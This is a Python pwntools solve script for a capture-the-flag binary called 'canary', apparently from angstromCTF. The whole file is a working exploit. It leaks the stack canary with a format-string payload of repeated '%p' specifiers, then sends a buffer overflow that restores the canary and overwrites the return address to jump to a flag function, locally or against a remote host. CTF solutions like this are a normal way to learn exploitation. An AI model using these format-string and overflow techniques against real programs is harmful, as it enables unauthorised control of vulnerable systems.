#!/usr/bin/env python2

from __future__ import print_function

"""
Run exploit locally with:
./solve.py

Run exploit against remote with:
./solve.py REMOTE HOST=shell.actf.co PORT=20701
"""

from pwn import *

PROG_PATH = './canary'

FLAG_ADDR = 0x400787
COOKIE_FORMAT_OFFSET = 17
COOKIE_OFFSET = 56


def init_pwntools_context():
    context.binary = PROG_PATH
    context.terminal = ['tmux', 'splitw', '-h']

    if not args['REMOTE']:
        context.log_level = 'debug'


def init_io():
    if args['REMOTE']:
        return remote(args['HOST'], int(args['PORT']))
    else:
        pty = process.PTY
        return process(PROG_PATH, stdin=pty, stdout=pty, stderr=pty)


def leak_stack_cookie(io):
    io.recvuntil('your name? ')
    io.sendline('.'.join(['%p' for _ in range(COOKIE_FORMAT_OFFSET)]))
    mem_dump = io.recvline()
    stack_cookie = mem_dump.split('.')[-1].rstrip('!\n')
    return int(stack_cookie, 16)


def win(io):
    stack_cookie = leak_stack_cookie(io)

    io.info('Leaked stack cookie: 0x%x' % stack_cookie)

    io.recvuntil('tell me? ')
    io.sendline(
        b'A' * COOKIE_OFFSET +
        p64(stack_cookie, endian='little') +
        b'B' * 8 +
        p64(FLAG_ADDR)
    )
    print(io.recvline())


if __name__ == '__main__':
    init_pwntools_context()
    io = init_io()
    win(io)
